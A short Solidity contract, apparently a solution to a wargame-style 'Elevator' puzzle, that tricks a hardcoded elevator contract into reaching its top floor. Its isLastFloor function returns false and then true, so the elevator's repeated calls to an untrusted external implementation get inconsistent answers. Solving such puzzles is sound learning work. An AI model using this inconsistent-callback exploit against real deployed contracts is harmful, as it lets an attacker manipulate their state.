// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract FakeBuilding is Building {
    address elevatorContract =
        address(0x37855C65f5B877B3D143405252aC11B2Bc2b659a);

    bool public usedOnce = false;

    function isLastFloor(uint256) external returns (bool) {
        bool ret = usedOnce;

        usedOnce = true;

        return ret;
    }

    function teleportToTop() public {
        bytes memory payload = abi.encodeWithSignature("goTo(uint256)", 69);

        (bool success, ) = elevatorContract.call(payload);

        require(success, "Failed to call goTo() method in the Elevator.");
    }
}
